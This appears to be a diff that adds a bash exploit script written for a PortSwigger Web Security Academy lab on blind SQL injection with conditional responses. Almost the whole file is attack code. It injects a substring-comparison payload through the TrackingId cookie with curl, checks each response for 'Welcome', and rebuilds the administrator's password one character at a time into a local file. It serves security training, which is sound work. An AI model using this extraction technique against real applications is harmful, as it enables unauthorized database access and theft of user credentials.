@@ -1,0 +1,33 @@
+#!/bin/bash
+## This is an exploit written for a blind sql injection lab. It tries to get
+# password of the admin using conditional responses
+# Lab link:
+# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
+
+
+
+# Change these by obtaining the generated subdomain and trackingIP when you
+# access this lab
+trackingId="TrackingId=NkPMa6RqIFj29lVC"
+domain="https://ac291fd81f662d6280ab4ac500970029.web-security-academy.net/"
+
+
+# Assumed max length of the password to be 30
+for c in {1..30}
+do
+  # Assumed password is written only in ascii chars
+  for n in {1..127}
+  do 
+    l=$(echo $n | awk '{ printf("%c", $0); }')
+    exploit="' and substring((select password from users where username='administrator'),$c,1) = '$l"
+    curl -s --cookie "$trackingId$exploit" \
+      $domain | grep -q --color "Welcome"
+    if [[ $? -eq "0" ]]; then
+      echo "Found char $c";
+      echo -n "$l" >> password2.txt
+      break
+    else
+      echo "$c:$l incorrect!"
+    fi
+  done
+done
